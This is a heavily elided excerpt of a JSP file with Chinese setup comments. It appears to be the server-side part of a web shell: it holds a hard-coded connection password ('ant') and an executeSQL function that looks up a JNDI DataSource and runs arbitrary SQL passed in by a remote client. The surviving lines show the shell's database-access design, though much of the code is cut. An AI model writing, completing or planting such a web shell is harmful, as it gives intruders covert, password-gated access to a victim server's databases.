...
说明：
 ...
 3. 数据库连接：
    java:/comp/env/jdbc/your-jndi-datasource-name
...
--%>
<%@page import="java.io.*,java.util.*,java.net.*,javax.sql.*,java.sql.*,java.text.*,javax.naming.*"%>
<%!
    String Pwd = "ant";   //连接密码
    // 数据编码 3 选 1
    ...
    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
        ...
        DataSource dataSource = (DataSource) context.lookup(x[0].trim());
